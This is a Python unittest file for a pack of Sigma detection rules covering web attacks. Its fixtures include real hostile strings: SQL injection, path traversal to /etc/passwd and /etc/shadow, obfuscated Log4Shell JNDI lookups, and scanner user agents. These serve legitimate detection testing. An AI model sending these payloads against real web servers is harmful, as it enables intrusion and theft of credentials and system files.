"""Web-attack Sigma pack: each rule loads, matches a hostile web event, and stays quiet on a benign one."""

import unittest
from pathlib import Path

from watchpost import attack, sigma

PACK = Path(__file__).resolve().parent.parent / "docs" / "sigma-examples" / "web-attacks"
EXAMPLES = PACK.parent
DASHBOARD = "GET /app/dashboard -> 200 ua=Mozilla/5.0 (X11; Linux x86_64) SYNTHETIC-BROWSER"


def event(event_type, message, src_ip="203.0.113.80"):
    return {"id": 1, "ts": "2026-11-18T12:00:00+00:00", "event_type": event_type,
            "src_ip": src_ip, "message": message}


# file, rule id, technique, severity, malicious messages, benign (event_type, message).
# Malicious lines are web_scan. Benign lines are the normal dashboard plus a lookalike that must not fire.
CASES = (
    (
        "vulnerability_scanner_user_agent.yml",
        "sigma_vulnerability_scanner_user_agent_on_web_server",
        "T1595.002",
        "medium",
        (
            "GET / -> 404 ua=Mozilla/5.00 (Nikto/2.5.0)",
            "GET /product?id=1 -> 500 ua=sqlmap/1.8.5",
            "GET / -> 200 ua=Mozilla/5.0 Nuclei/3.2.0",
        ),
        (
            ("web_request", DASHBOARD),
            ("web_scan", "GET /.env -> 404 ua=Mozilla/5.0"),
            ("auth_failure", "installed nikto on the jump host"),
        ),
    ),
    (
        "sensitive_file_wordlist_probe.yml",
        "sigma_sensitive_file_wordlist_probe_against_web_server",
        "T1595.003",
        "medium",
        (
            "GET /.env -> 404 ua=Mozilla/5.0",
            "GET /.git/config -> 404 ua=Mozilla/5.0",
            "GET / -> 404 ua=gobuster/3.6",
        ),
        (
            ("web_request", DASHBOARD),
            ("web_request", "GET /health -> 200 ua=Mozilla/5.0"),
            ("file_access", "read /.env from the backup disk"),
        ),
    ),
    (
        "sql_injection_web_request.yml",
        "sigma_sql_injection_payload_in_web_request",
        "T1190",
        "high",
        (
            "GET /search?q=1 union select password from users -> 500",
            "GET /item?id=1%20union%20select%201,2,3 -> 500",
            "GET /item?id=1%27%20or%201=1-- -> 500",
        ),
        (
            ("web_request", DASHBOARD),
            ("web_request", "GET /search?q=select+product -> 200"),
            ("auth_failure", "user said union select during the lab"),
        ),
    ),
    (
        "path_traversal_web_request.yml",
        "sigma_path_traversal_to_sensitive_file_in_web_request",
        "T1190",
        "high",
        (
            "GET /../../etc/passwd -> 400",
            "GET /..%2f..%2fetc/passwd -> 400",
            "GET /%2e%2e/%2e%2e/etc/shadow -> 400",
        ),
        (
            ("web_request", DASHBOARD),
            ("web_request", "GET /files/../images/logo.png -> 200"),
            ("web_request", "GET /static/etc/passwd -> 200"),
            ("file_access", "opened ../etc/passwd on the host"),
        ),
    ),
    (
        "log4shell_jndi_web_request.yml",
        "sigma_log_shell_jndi_lookup_in_web_request",
        "T1190",
        "critical",
        (
            "GET / -> 200 ua=${jndi:ldap://203.0.113.50/a}",
            "GET /search?q=%24%7bjndi:ldap://203.0.113.50/a -> 400",
            "GET /?x=${${::-j}ndi:ldap://203.0.113.50/a -> 400",
        ),
        (
            ("web_request", DASHBOARD),
            ("web_request", "GET /docs/jndi-naming -> 200"),
            ("auth_failure", "ticket mentioned ${jndi:ldap://lab}"),
        ),
    ),
    (
        "failed_web_login_password_guessing.yml",
        "sigma_failed_web_login_password_guessing",
        "T1110.001",
        "medium",
        (
            "POST /wp-login.php -> 401 ua=Mozilla/5.0",
            "POST /xmlrpc.php -> 403 ua=Mozilla/5.0",
            "POST /api/login -> 401 ua=Mozilla/5.0",
        ),
        (
            ("web_request", DASHBOARD),
            ("web_request", "POST /api/login -> 200 ua=Mozilla/5.0"),
            ("web_request", "GET /wp-login.php -> 200 ua=Mozilla/5.0"),
            ("web_request", "POST /api/orders -> 401 ua=Mozilla/5.0"),
            ("auth_failure", "POST /wp-login.php -> 401 outside the web log"),
        ),
    ),
)


class WebAttackSigmaPackTests(unittest.TestCase):
    def test_pack_is_six_rules(self):
        names = sorted(p.name for p in PACK.glob("*.yml"))
        self.assertEqual(names, sorted(case[0] for case in CASES))

    def test_titles_and_ids_are_unique_in_sigma_examples(self):
        titles, ids = {}, {}
        for path in sorted(EXAMPLES.rglob("*.yml")):
            doc = sigma.parse_yaml(path.read_text())
            self.assertNotIn(doc["title"], titles, path.name)
            self.assertNotIn(doc["id"], ids, path.name)
            titles[doc["title"]] = path
            ids[doc["id"]] = path
        self.assertIn("Failed Admin Login From External Source", titles)

    def test_each_rule_loads_matches_and_ignores_benign(self):
        for filename, rule_id, technique, severity, malicious, benign in CASES:
            with self.subTest(rule=filename):
                compiled = sigma.compile_rule((PACK / filename).read_text())
                self.assertEqual(compiled["rule_id"], rule_id)
                self.assertEqual([t["id"] for t in compiled["techniques"]], [technique])
                self.assertEqual(compiled["techniques"][0], attack.technique(technique))
                self.assertEqual(compiled["severity"], severity)
                for message in malicious:
                    hit = event("web_scan", message)
                    self.assertTrue(sigma.matches(compiled["params"], hit), message)
                    findings = sigma.run([hit], compiled["params"])
                    self.assertEqual(len(findings), 1, message)
                    self.assertEqual(findings[0]["event_ids"], [1])
                for event_type, message in benign:
                    quiet = event(event_type, message, src_ip="10.0.1.20")
                    self.assertFalse(sigma.matches(compiled["params"], quiet), message)
                    self.assertEqual(sigma.run([quiet], compiled["params"]), [])
